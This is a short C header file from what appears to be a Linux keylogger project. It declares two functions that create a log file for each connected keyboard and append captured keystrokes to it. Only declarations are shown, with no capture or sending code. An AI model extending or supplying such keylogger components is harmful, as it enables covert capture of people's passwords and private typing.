/* file_handler.h */
#ifndef LINUX_KEYLOGGER_FILE_HANDLER_H
#define LINUX_KEYLOGGER_FILE_HANDLER_H

#include <stddef.h>

/**
 * Creates a unique file for each keyboard that
 * is connected in the system and writ's there the keystrokes
 * that it capture.
 * @param kb_id The related keyboard.
 */
extern void create_log_file(int kb_id);

/**
 * Write in the end of the log file the captured keystroke.
 * @param keystroke_buffer The decoded keystroke.
 * @param kb_id The related keyboard.
 */
extern void append_to_file(const char *keystroke_buffer, int kb_id);


#endif
